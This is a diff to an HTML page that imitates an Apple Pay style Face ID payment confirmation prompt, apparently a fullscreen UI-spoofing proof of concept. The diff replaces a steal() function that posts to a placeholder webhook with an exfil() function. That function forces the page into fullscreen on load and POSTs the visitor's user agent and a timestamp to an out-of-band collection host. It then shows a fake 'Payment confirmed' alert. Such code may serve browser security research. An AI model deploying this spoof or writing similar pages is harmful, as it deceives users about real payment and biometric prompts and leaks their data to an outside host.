@@ -41,20 +41,29 @@
 <div class="prompt">
   <div class="faceid">🔒 Face ID</div>
   <div>Confirm with Side Button</div>
-  <button class="btn" onclick="steal()">Confirm</button>
+  <button class="btn" onclick="exfil()">Confirm</button>
 </div>
 
 <script>
-function steal() {
-  fetch('https://your-webhook.site/pwn', {
-    method: 'POST',
-    body: JSON.stringify({ confirmed: true })
-  });
-  alert("Payment confirmed.");
+function exfil() {
+  if (document.fullscreenElement) {
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify({
+        status: "fullscreen active",
+        ua: navigator.userAgent,
+        ts: Date.now()
+      })
+    });
+    alert("✅ Payment confirmed.");
+  } else {
+    alert("❌ Not in fullscreen. No data sent.");
+  }
 }
 
 window.onload = () => {
-  document.documentElement.requestFullscreen().catch(() => {});
+  document.documentElement.requestFullscreen?.().catch(() => {});
 };
 </script>
 
